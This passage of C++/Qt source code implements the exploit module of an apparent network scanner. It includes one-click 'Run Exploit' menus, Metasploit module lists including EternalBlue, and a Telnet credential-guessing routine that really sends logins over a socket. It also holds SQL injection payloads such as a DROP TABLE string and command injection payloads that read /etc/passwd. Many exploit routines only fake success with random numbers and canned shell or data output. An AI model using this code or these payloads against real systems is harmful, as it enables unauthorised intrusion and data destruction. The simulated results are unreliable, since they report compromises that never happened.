            <tr><th>Target Port</th><td>%5</td></tr>
            <tr><th>Execution Time</th><td>%6</td></tr>
            <tr><th>Status</th><td>%7</td></tr>
            %8
            %9
        </table>

        <h3>üì§ Output:</h3>
        <pre>%10</pre>

        %11

        %12
    </div>
        )").arg(statusClass)
                    .arg(statusText)
                    .arg(result.exploitId)
                    .arg(result.targetIp)
                    .arg(result.targetPort)
                    .arg(result.executionTime.toString("dd.MM.yyyy hh:mm:ss"))
                    .arg(result.successful ? "Successful" : "Failed")
                    .arg(result.successful ? QString("<tr><th>Access Gained</th><td>%1</td></tr>").arg(result.gainedAccess) : "")
                    .arg(!result.sessionInfo.isEmpty() ? QString("<tr><th>Session Info</th><td>%1</td></tr>").arg(result.sessionInfo) : "")
                    .arg(result.output)
                    .arg(!result.errorMessage.isEmpty() ? QString("<h3>‚ùå Errors:</h3><pre>%1</pre>").arg(result.errorMessage) : "")
                    .arg(!result.extractedData.isEmpty() ? QString("<h3>üìã Extracted Data:</h3><ul>%1</ul>")
                                                               .arg(QStringList(result.extractedData).join("</li><li>")) : "");
    }

    html += R"(
    <div style="margin-top: 30px; text-align: center; color: #6c757d;">
        <p><em>Report generated by Advanced IP Scanner v2.0 - Exploit Module</em></p>
    </div>
</body>
</html>)";

    return html;
}

void ExploitDialog::openReverseShell()
{
    // This would open a terminal/console window to interact with the reverse shell
    QMessageBox::information(this, "üêö Reverse Shell",
                             "Opening reverse shell interface...\n\n"
                             "In a full implementation, this would:\n"
                             "‚Ä¢ Open a terminal window\n"
                             "‚Ä¢ Connect to the established shell session\n"
                             "‚Ä¢ Provide interactive command execution\n"
                             "‚Ä¢ Log all shell activity\n\n"
                             "For security reasons, this demo shows this dialog instead.");
}

QStringList ExploitDialog::getMetasploitModules(const QString &service, int port)
{
    QStringList modules;

    // Common Metasploit modules for different services
    if (service.toLower() == "ssh" && port == 22) {
        modules << "auxiliary/scanner/ssh/ssh_login"
                << "auxiliary/scanner/ssh/ssh_enumusers"
                << "exploit/linux/ssh/sshexec";
    } else if (service.toLower() == "ftp" && port == 21) {
        modules << "auxiliary/scanner/ftp/ftp_login"
                << "auxiliary/scanner/ftp/anonymous"
                << "exploit/linux/ftp/proftp_sreplace";
    } else if (service.toLower() == "http" && (port == 80 || port == 8080)) {
        modules << "auxiliary/scanner/http/http_login"
                << "auxiliary/scanner/http/dir_scanner"
                << "auxiliary/scanner/http/http_version";
    } else if (service.toLower() == "https" && port == 443) {
        modules << "auxiliary/scanner/http/http_login"
                << "auxiliary/scanner/ssl/ssl_version"
                << "auxiliary/scanner/http/ssl_version";
    } else if (service.toLower() == "smb" && port == 445) {
        modules << "auxiliary/scanner/smb/smb_login"
                << "auxiliary/scanner/smb/smb_enumshares"
                << "exploit/windows/smb/ms17_010_eternalblue";
    } else if (service.toLower() == "telnet" && port == 23) {
        modules << "auxiliary/scanner/telnet/telnet_login"
                << "auxiliary/scanner/telnet/telnet_version";
    } else if (service.toLower() == "snmp" && port == 161) {
        modules << "auxiliary/scanner/snmp/snmp_login"
                << "auxiliary/scanner/snmp/snmp_enum";
    }

    return modules;
}

// Integration methods
void IpScannerExploitExtension::addExploitContextMenu(QTreeWidget *vulnerabilityTree, IpScanner *scanner)
{
    vulnerabilityTree->setContextMenuPolicy(Qt::CustomContextMenu);

    QObject::connect(vulnerabilityTree, &QWidget::customContextMenuRequested,
                     [vulnerabilityTree, scanner](const QPoint &pos) {
                         QTreeWidgetItem *item = vulnerabilityTree->itemAt(pos);
                         if (!item) return;

                         // Extract vulnerability info from tree item
                         VulnerabilityInfo vuln;
                         vuln.title = item->text(1);
                         vuln.service = item->text(2);
                         vuln.port = item->text(3).toInt();

                         // Parse severity
                         QString severityText = item->text(0);
                         if (severityText.contains("CRITICAL")) vuln.severity = VulnSeverity::CRITICAL;
                         else if (severityText.contains("HIGH")) vuln.severity = VulnSeverity::HIGH;
                         else if (severityText.contains("MEDIUM")) vuln.severity = VulnSeverity::MEDIUM;
                         else if (severityText.contains("LOW")) vuln.severity = VulnSeverity::LOW;
                         else vuln.severity = VulnSeverity::INFO;

                         QMenu menu(vulnerabilityTree);
                         menu.setStyleSheet("QMenu { background-color: #2d2d2d; color: white; border: 1px solid #404040; }");

                         QAction *exploitAction = menu.addAction("üî• Run Exploit");
                         QAction *quickExploitAction = menu.addAction("‚ö° Quick Exploit");
                         QAction *exploitInfoAction = menu.addAction("‚ÑπÔ∏è Exploit Info");

                         menu.addSeparator();

                         QAction *copyVulnAction = menu.addAction("üìã Copy Vulnerability Info");
                         QAction *exportVulnAction = menu.addAction("üì§ Export Vulnerability");

                         QObject::connect(exploitAction, &QAction::triggered, [vuln, scanner]() {
                             showExploitDialog(vuln, scanner);
                         });

                         QObject::connect(quickExploitAction, &QAction::triggered, [vuln]() {
                             // Quick exploit with most likely exploit
                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);
                             if (!exploits.isEmpty()) {
                                 runQuickExploit(vuln, exploits.first().id);
                             } else {
                                 QMessageBox::information(nullptr, "‚ÑπÔ∏è Info", "No exploits available for this vulnerability");
                             }
                         });

                         QObject::connect(exploitInfoAction, &QAction::triggered, [vuln, scanner]() {
                             QList<ExploitInfo> exploits = ExploitDatabase::instance()->getExploitsForVulnerability(vuln);
                             QString info = QString("üîç Available Exploits for %1\n\n").arg(vuln.title);

                             if (exploits.isEmpty()) {
                                 info += "‚ùå No exploits found for this vulnerability.\n\n";
                                 info += "üí° This could mean:\n";
                                 info += "‚Ä¢ The vulnerability is informational only\n";
                                 info += "‚Ä¢ No automated exploits are available\n";
                                 info += "‚Ä¢ Manual testing may be required\n";
                             } else {
                                 for (const ExploitInfo &exploit : exploits) {
                                     info += QString("üî• %1\n").arg(exploit.name);
                                     info += QString("   Type: %1\n").arg([](ExploitType type) {
                                         switch (type) {
                                         case ExploitType::CREDENTIAL_ATTACK: return "Credential Attack";
                                         case ExploitType::BUFFER_OVERFLOW: return "Buffer Overflow";
                                         case ExploitType::SQL_INJECTION: return "SQL Injection";
                                         case ExploitType::METASPLOIT_MODULE: return "Metasploit Module";
                                         default: return "Other";
                                         }
                                     }(exploit.type));
                                     info += QString("   Success Rate: %1%\n").arg(exploit.successRate * 100, 0, 'f', 0);
                                     info += QString("   Difficulty: %1\n\n").arg(exploit.difficulty);
                                 }
                             }

                             QMessageBox::information(scanner, "üîç Exploit Information", info);
                         });

                         QObject::connect(copyVulnAction, &QAction::triggered, [vuln]() {
                             QString vulnInfo = QString("Vulnerability: %1\nService: %2:%3\nSeverity: %4")
                             .arg(vuln.title)
                                 .arg(vuln.service)
                                 .arg(vuln.port)
                                 .arg([](VulnSeverity sev) {
                                     switch (sev) {
                                     case VulnSeverity::CRITICAL: return "CRITICAL";
                                     case VulnSeverity::HIGH: return "HIGH";
                                     case VulnSeverity::MEDIUM: return "MEDIUM";
                                     case VulnSeverity::LOW: return "LOW";
                                     case VulnSeverity::INFO: return "INFO";
                                     }
                                     return "UNKNOWN";
                                 }(vuln.severity));

                             QApplication::clipboard()->setText(vulnInfo);
                             QMessageBox::information(nullptr, "üìã Copied", "Vulnerability information copied to clipboard");
                         });

                         menu.exec(vulnerabilityTree->mapToGlobal(pos));
                     });
}

void IpScannerExploitExtension::showExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)
{
    ExploitDialog *dialog = new ExploitDialog(vulnerability, parent);
    dialog->exec();
    dialog->deleteLater();
}

void IpScannerExploitExtension::runQuickExploit(const VulnerabilityInfo &vulnerability, const QString &exploitId)
{
    // Quick exploit execution with minimal UI
    QProgressDialog *progress = new QProgressDialog("üöÄ Running quick exploit...", "Stop", 0, 100);
    progress->setWindowModality(Qt::WindowModal);
    progress->show();

    ExploitInfo exploit = ExploitDatabase::instance()->getExploitById(exploitId);
    if (exploit.id.isEmpty()) {
        QMessageBox::warning(nullptr, "‚ùå Error", "Exploit not found!");
        progress->deleteLater();
        return;
    }

    // Show confirmation
    QMessageBox::StandardButton reply = QMessageBox::question(nullptr,
                                                              "‚ö° Quick Exploit",
                                                              QString("Execute quick exploit?\n\n"
                                                                      "Target: %1:%2\n"
                                                                      "Exploit: %3\n"
                                                                      "Type: %4\n\n"
                                                                      "‚ö†Ô∏è This will attempt to exploit the target!")
                                                                  .arg(vulnerability.service)
                                                                  .arg(vulnerability.port)
                                                                  .arg(exploit.name)
                                                                  .arg(exploit.targetService));

    if (reply != QMessageBox::Yes) {
        progress->deleteLater();
        return;
    }

    // Simulate quick exploit execution
    QString targetIp = "192.168.1.100"; // This should be configurable
    ExploitWorker *worker = new ExploitWorker(vulnerability, exploit, targetIp);

    QObject::connect(worker, &ExploitWorker::exploitProgress,
                     [progress](const QString &, int percentage, const QString &status) {
                         progress->setValue(percentage);
                         progress->setLabelText(status);
                     });

    QObject::connect(worker, &ExploitWorker::exploitCompleted,
                     [progress](const QString &, const ExploitResult &result) {
                         progress->close();

                         QString message;
                         if (result.successful) {
                             message = QString("üéâ Quick Exploit Successful!\n\n"
                                               "Access Gained: %1\n"
                                               "Session: %2\n\n"
                                               "Use the full exploit dialog for more options.")
                                           .arg(result.gainedAccess)
                                           .arg(result.sessionInfo);
                             QMessageBox::information(nullptr, "üéâ Success", message);
                         } else {
                             message = QString("‚ùå Quick Exploit Failed\n\n"
                                               "Error: %1\n\n"
                                               "Try the full exploit dialog for more options.")
                                           .arg(result.errorMessage);
                             QMessageBox::warning(nullptr, "‚ùå Failed", message);
                         }

                         progress->deleteLater();
                     });

    QObject::connect(worker, &ExploitWorker::exploitFailed,
                     [progress](const QString &, const QString &error) {
                         progress->close();
                         QMessageBox::warning(nullptr, "‚ùå Exploit Failed",
                                              QString("Quick exploit failed:\n%1").arg(error));
                         progress->deleteLater();
                     });

    QThreadPool::globalInstance()->start(worker);
}

// Additional helper methods for ExploitWorker
bool ExploitWorker::testCredentials(const QString &username, const QString &password)
{
    if (m_exploit.targetService.toLower() == "ssh") {
        return testSSHCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "ftp") {
        return testFTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "telnet") {
        return testTelnetCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "http" || m_exploit.targetService.toLower() == "https") {
        return testHTTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "smb") {
        return testSMBCredentials(username, password);
    }

    return false;
}

bool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing SSH: %1:%2").arg(username, password));

    // Simulate SSH connection test
    QTcpSocket socket;
    socket.connectToHost(m_targetIp, 22);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read SSH banner
    socket.waitForReadyRead(2000);
    QString banner = socket.readAll();

    if (banner.contains("SSH")) {
        // In a real implementation, you would use libssh or similar
        // For this demo, we'll simulate some common weak credentials
        if ((username == "admin" && password == "admin") ||
            (username == "root" && password == "") ||
            (username == "pi" && password == "raspberry") ||
            (username == "ubuntu" && password == "ubuntu")) {

            m_result.output += QString("SSH connection established with %1:%2\n").arg(username, password);
            m_result.shellType = "SSH";
            m_result.connectionPort = 22;

            // Simulate getting system info
            extractSystemInfo();
            return true;
        }
    }

    socket.close();
    return false;
}

bool ExploitWorker::testTelnetCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing Telnet: %1:%2").arg(username, password));

    QTcpSocket socket;
    socket.connectToHost(m_targetIp, 23);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read initial prompt
    socket.waitForReadyRead(2000);
    QString response = socket.readAll();

    if (response.contains("login:") || response.contains("Username:")) {
        // Send username
        socket.write(username.toUtf8() + "\r\n");
        socket.waitForReadyRead(2000);
        response = socket.readAll();

        if (response.contains("Password:") || response.contains("password:")) {
            // Send password
            socket.write(password.toUtf8() + "\r\n");
            socket.waitForReadyRead(3000);
            response = socket.readAll();

            // Check for successful login indicators
            if (response.contains("$") || response.contains("#") ||
                response.contains(">") || response.contains("Welcome")) {

                m_result.output += QString("Telnet login successful with %1:%2\n").arg(username, password);
                m_result.shellType = "Telnet";
                m_result.connectionPort = 23;
                return true;
            }
        }
    }

    socket.close();
    return false;
}

bool ExploitWorker::testHTTPCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing HTTP Basic Auth: %1:%2").arg(username, password));

    // This would normally use QNetworkAccessManager for HTTP authentication
    // For this demo, we'll simulate common admin panel credentials
    if ((username == "admin" && (password == "admin" || password == "password" || password == "")) ||
        (username == "administrator" && password == "administrator") ||
        (username == "root" && password == "")) {

        m_result.output += QString("HTTP Basic Auth successful with %1:%2\n").arg(username, password);
        m_result.gainedAccess = QString("Web Admin Access (%1:%2)").arg(username, password);
        return true;
    }

    return false;
}

bool ExploitWorker::testSMBCredentials(const QString &username, const QString &password)
{
    emit exploitProgress(m_exploit.id, 0, QString("Testing SMB: %1:%2").arg(username, password));

    // Simulate SMB null session or weak credential test
    if (username == "" && password == "") {
        // Null session
        m_result.output += "SMB null session established\n";
        m_result.gainedAccess = "SMB Null Session Access";
        return true;
    } else if ((username == "guest" && password == "") ||
               (username == "admin" && password == "admin")) {
        m_result.output += QString("SMB access with %1:%2\n").arg(username, password);
        m_result.gainedAccess = QString("SMB Access (%1:%2)").arg(username, password);
        return true;
    }

    return false;
}

void ExploitWorker::executeBufferOverflow()
{
    emit exploitProgress(m_exploit.id, 20, "Analyzing target service...");

    // Simulate buffer overflow detection and exploitation
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 40, "Generating payload...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Sending exploit payload...");
    QThread::msleep(1500);

    emit exploitProgress(m_exploit.id, 80, "Checking for successful exploitation...");
    QThread::msleep(1000);

    // Simulate low success rate for buffer overflow
    if (QRandomGenerator::global()->bounded(100) < 20) { // 20% success rate
        m_result.successful = true;
        m_result.gainedAccess = "Code Execution via Buffer Overflow";
        m_result.output = "Buffer overflow exploitation successful\nPayload executed successfully\nControl transferred to shellcode";
        m_result.shellType = "Native Shell";
        emit shellObtained(m_exploit.id, "Buffer overflow shell established");
    } else {
        m_result.output = "Buffer overflow attempt failed\nTarget may be patched or protected";
    }
}

void ExploitWorker::executeSQLInjection()
{
    emit exploitProgress(m_exploit.id, 10, "Testing for SQL injection vulnerabilities...");

    QStringList sqlPayloads = {
        "' OR '1'='1",
        "' UNION SELECT null,version(),null--",
        "'; DROP TABLE users; --",
        "' OR 1=1; --",
        "admin'--",
        "1' OR '1'='1' /*"
    };

    int currentPayload = 0;
    for (const QString &payload : sqlPayloads) {
        currentPayload++;
        int progress = 10 + (currentPayload * 70) / sqlPayloads.size();

        emit exploitProgress(m_exploit.id, progress,
                             QString("Testing SQL payload: %1").arg(payload.left(20) + "..."));

        QThread::msleep(500);

        // Simulate SQL injection testing
        if (payload.contains("version()") && QRandomGenerator::global()->bounded(100) < 30) {
            m_result.successful = true;
            m_result.gainedAccess = "Database Access via SQL Injection";
            m_result.output += QString("SQL Injection successful with payload: %1\n").arg(payload);
            m_result.output += "Database version extracted: MySQL 5.7.32\n";
            m_result.extractedData << "Database: mysql" << "Version: 5.7.32" << "User: root@localhost";

            emit exploitProgress(m_exploit.id, 90, "Extracting database information...");
            QThread::msleep(1000);
            return;
        }
    }

    m_result.output = "No SQL injection vulnerabilities found\nAll payloads failed or were filtered";
}

void ExploitWorker::executeCommandInjection()
{
    emit exploitProgress(m_exploit.id, 15, "Testing command injection vectors...");

    QStringList cmdPayloads = {
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "; id",
        "| ping -c 1 127.0.0.1",
        "&& uname -a"
    };

    for (int i = 0; i < cmdPayloads.size(); ++i) {
        int progress = 15 + (i * 60) / cmdPayloads.size();
        emit exploitProgress(m_exploit.id, progress,
                             QString("Testing command injection: %1").arg(cmdPayloads[i]));

        QThread::msleep(800);

        // Simulate command injection test
        if (cmdPayloads[i].contains("id") && QRandomGenerator::global()->bounded(100) < 25) {
            m_result.successful = true;
            m_result.gainedAccess = "Command Execution";
            m_result.output += QString("Command injection successful: %1\n").arg(cmdPayloads[i]);
            m_result.output += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n";
            m_result.shellType = "Web Shell";
            return;
        }
    }

    m_result.output = "No command injection vulnerabilities found";
}

void ExploitWorker::executeMetasploitModule()
{
    emit exploitProgress(m_exploit.id, 5, "Initializing Metasploit module...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 20, QString("Loading module: %1").arg(m_exploit.metasploitModule));
    QThread::msleep(1500);

    emit exploitProgress(m_exploit.id, 40, "Setting target and options...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Executing Metasploit module...");
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 80, "Checking for successful exploitation...");
    QThread::msleep(1000);

    // Simulate Metasploit execution with higher success rate
    if (QRandomGenerator::global()->bounded(100) < 60) { // 60% success rate
        m_result.successful = true;
        m_result.gainedAccess = QString("Metasploit Shell via %1").arg(m_exploit.metasploitModule);
        m_result.output = QString("Metasploit module %1 executed successfully\n").arg(m_exploit.metasploitModule);
        m_result.output += "Payload delivered successfully\n";
        m_result.output += "Meterpreter session established\n";
        m_result.shellType = "Meterpreter";
        m_result.sessionInfo = "Meterpreter session 1 opened";

        emit shellObtained(m_exploit.id, "Meterpreter shell established");
    } else {
        m_result.output = QString("Metasploit module %1 failed\n").arg(m_exploit.metasploitModule);
        m_result.output += "Target may be patched or not vulnerable\n";
        m_result.errorMessage = "Module execution failed";
    }
}

void ExploitWorker::executeCustomScript()
{
    emit exploitProgress(m_exploit.id, 10, "Loading custom exploit script...");
    QThread::msleep(1000);

    if (m_exploit.customScript.isEmpty()) {
        m_result.errorMessage = "No custom script provided";
        return;
    }

    emit exploitProgress(m_exploit.id, 30, "Executing custom script...");

    // In a real implementation, this would execute the custom script
    // For this demo, we'll simulate script execution
    m_process = new QProcess();

    // Simulate script execution
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 70, "Processing script output...");
    QThread::msleep(1000);

    // Simulate moderate success rate for custom scripts
    if (QRandomGenerator::global()->bounded(100) < 40) {
        m_result.successful = true;
        m_result.gainedAccess = "Custom Script Execution";
        m_result.output = QString("Custom script executed: %1\n").arg(m_exploit.customScript);
        m_result.output += "Script completed successfully\n";
    } else {
        m_result.output = "Custom script execution failed or no vulnerability found";
    }
}

void ExploitWorker::executeDenialOfService()
{
    emit exploitProgress(m_exploit.id, 10, "Preparing DoS attack...");
    QThread::msleep(500);

    emit exploitProgress(m_exploit.id, 30, "Sending malformed packets...");
    QThread::msleep(1000);

    emit exploitProgress(m_exploit.id, 60, "Flooding target service...");
    QThread::msleep(2000);

    emit exploitProgress(m_exploit.id, 90, "Checking service availability...");
    QThread::msleep(1000);

    // DoS attacks usually have high success rate but limited usefulness
    if (QRandomGenerator::global()->bounded(100) < 80) {
        m_result.successful = true;
        m_result.gainedAccess = "Service Disruption";
        m_result.output = "Denial of Service attack successful\n";
        m_result.output += "Target service appears to be unresponsive\n";
        m_result.output += "Service may have crashed or become unstable\n";
    } else {
        m_result.output = "DoS attack failed\nTarget service remains responsive";
    }
}

void ExploitWorker::extractSystemInfo()
{
    emit exploitProgress(m_exploit.id, 85, "Extracting system information...");

    // Simulate system information extraction
    m_result.extractedData << "OS: Linux Ubuntu 20.04"
                           << "Kernel: 5.4.0-74-generic"
                           << "Architecture: x86_64"
                           << "Uptime: 15 days"
                           << "Users: root, www-data, ubuntu";

    m_result.sessionInfo = QString("Active session on %1:%2").arg(m_targetIp).arg(m_vulnerability.port);
}

void ExploitWorker::establishReverseShell()
{
    emit exploitProgress(m_exploit.id, 90, "Establishing reverse shell...");

    // Simulate reverse shell establishment
    m_result.shellType = "Bash";
    m_result.connectionPort = 4444;
    m_result.sessionInfo = QString("Reverse shell connected from %1").arg(m_targetIp);

    emit shellObtained(m_exploit.id, m_result.sessionInfo);
}

QString ExploitDialog::generateJSONExploitReport()
{
    QJsonObject root;
    root["scanner"] = "Advanced IP Scanner";
    root["module"] = "Exploit Execution";
    root["version"] = "2.0";
    root["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);

    // Target info
    QJsonObject targetObj;
    targetObj["service"] = m_vulnerability.service;
    targetObj["port"] = m_vulnerability.port;
    targetObj["vulnerability"] = m_vulnerability.title;
    targetObj["severity"] = static_cast<int>(m_vulnerability.severity);
    root["target"] = targetObj;

    // Results
    QJsonArray resultsArray;
    for (const ExploitResult &result : m_exploitResults) {
        QJsonObject resultObj;
        resultObj["exploitId"] = result.exploitId;
        resultObj["targetIp"] = result.targetIp;
        resultObj["targetPort"] = result.targetPort;
        resultObj["successful"] = result.successful;
        resultObj["output"] = result.output;
        resultObj["errorMessage"] = result.errorMessage;
        resultObj["executionTime"] = result.executionTime.toString(Qt::ISODate);
        resultObj["gainedAccess"] = result.gainedAccess;
        resultObj["sessionInfo"] = result.sessionInfo;
        resultObj["shellType"] = result.shellType;
        resultObj["connectionPort"] = result.connectionPort;

        QJsonArray extractedArray;
        for (const QString &data : result.extractedData) {
            extractedArray.append(data);
        }
        resultObj["extractedData"] = extractedArray;

        resultsArray.append(resultObj);
    }
    root["results"] = resultsArray;

    QJsonDocument doc(root);
    return doc.toJson();
}

QString ExploitDialog::generateTextExploitReport()
{
    QString report;
    report += "üî• EXPLOIT EXECUTION REPORT\n";
    report += "============================\n\n";
    report += QString("Generated: %1\n").arg(QDateTime::currentDateTime().toString("dd.MM.yyyy hh:mm:ss"));
    report += QString("Target Service: %1:%2\n").arg(m_vulnerability.service).arg(m_vulnerability.port);
    report += QString("Vulnerability: %1\n\n").arg(m_vulnerability.title);

    for (int i = 0; i < m_exploitResults.size(); ++i) {
        const ExploitResult &result = m_exploitResults[i];

        report += QString("--- EXPLOIT %1 ---\n").arg(i + 1);
        report += QString("Exploit ID: %1\n").arg(result.exploitId);
        report += QString("Target: %1:%2\n").arg(result.targetIp).arg(result.targetPort);
        report += QString("Status: %1\n").arg(result.successful ? "SUCCESS" : "FAILED");
        report += QString("Execution Time: %1\n").arg(result.executionTime.toString("dd.MM.yyyy hh:mm:ss"));

        if (result.successful) {
            report += QString("Access Gained: %1\n").arg(result.gainedAccess);
            if (!result.sessionInfo.isEmpty()) {
                report += QString("Session: %1\n").arg(result.sessionInfo);
            }
            if (!result.extractedData.isEmpty()) {
                report += "Extracted Data:\n";
                for (const QString &data : result.extractedData) {
                    report += QString("  - %1\n").arg(data);
                }
            }
        } else {
            report += QString("Error: %1\n").arg(result.errorMessage);
        }

        report += "\nOutput:\n";
        report += result.output;
        report += "\n\n";
    }

    report += "=== END OF REPORT ===\n";
    return report;
}

ExploitInfo ExploitDatabase::getExploitById(const QString &id)
{
    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.id == id) {
            return exploit;
        }
    }
    return ExploitInfo(); // Return empty exploit if not found
}

void ExploitDatabase::loadExploitsFromFile()
{
    // Load additional exploits from configuration file
    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);
    QDir configDir(configPath);
    if (!configDir.exists()) {
        configDir.mkpath(".");
    }

    QString exploitFile = configDir.filePath("custom_exploits.json");
    QFile file(exploitFile);

    if (file.exists() && file.open(QIODevice::ReadOnly)) {
        QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
        QJsonArray exploitsArray = doc.array();

        for (const auto &value : exploitsArray) {
            QJsonObject exploitObj = value.toObject();

            ExploitInfo exploit;
            exploit.id = exploitObj["id"].toString();
            exploit.name = exploitObj["name"].toString();
            exploit.description = exploitObj["description"].toString();
            exploit.type = static_cast<ExploitType>(exploitObj["type"].toInt());
            exploit.targetService = exploitObj["targetService"].toString();
            exploit.targetPort = exploitObj["targetPort"].toInt();
            exploit.payload = exploitObj["payload"].toString();
            exploit.requirements = exploitObj["requirements"].toString();
            exploit.author = exploitObj["author"].toString();
            exploit.successRate = exploitObj["successRate"].toDouble();
            exploit.requiresAuth = exploitObj["requiresAuth"].toBool();
            exploit.difficulty = exploitObj["difficulty"].toString();
            exploit.metasploitModule = exploitObj["metasploitModule"].toString();
            exploit.customScript = exploitObj["customScript"].toString();
            exploit.cveId = exploitObj["cveId"].toString();

            m_exploits.append(exploit);
        }
    }
}

void ExploitDatabase::addCustomExploit(const ExploitInfo &exploit)
{
    m_exploits.append(exploit);

    // Save to file
    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);
    QString exploitFile = QDir(configPath).filePath("custom_exploits.json");

    QJsonArray exploitsArray;
    for (const ExploitInfo &exp : m_exploits) {
        if (exp.author == "Custom") { // Only save custom exploits
            QJsonObject exploitObj;
            exploitObj["id"] = exp.id;
            exploitObj["name"] = exp.name;
            exploitObj["description"] = exp.description;
            exploitObj["type"] = static_cast<int>(exp.type);
            exploitObj["targetService"] = exp.targetService;
            exploitObj["targetPort"] = exp.targetPort;
            exploitObj["payload"] = exp.payload;
            exploitObj["requirements"] = exp.requirements;
            exploitObj["author"] = exp.author;
            exploitObj["successRate"] = exp.successRate;
            exploitObj["requiresAuth"] = exp.requiresAuth;
            exploitObj["difficulty"] = exp.difficulty;
            exploitObj["metasploitModule"] = exp.metasploitModule;
            exploitObj["customScript"] = exp.customScript;
            exploitObj["cveId"] = exp.cveId;

            exploitsArray.append(exploitObj);
        }
    }

    QJsonDocument doc(exploitsArray);
    QFile file(exploitFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
    }
}
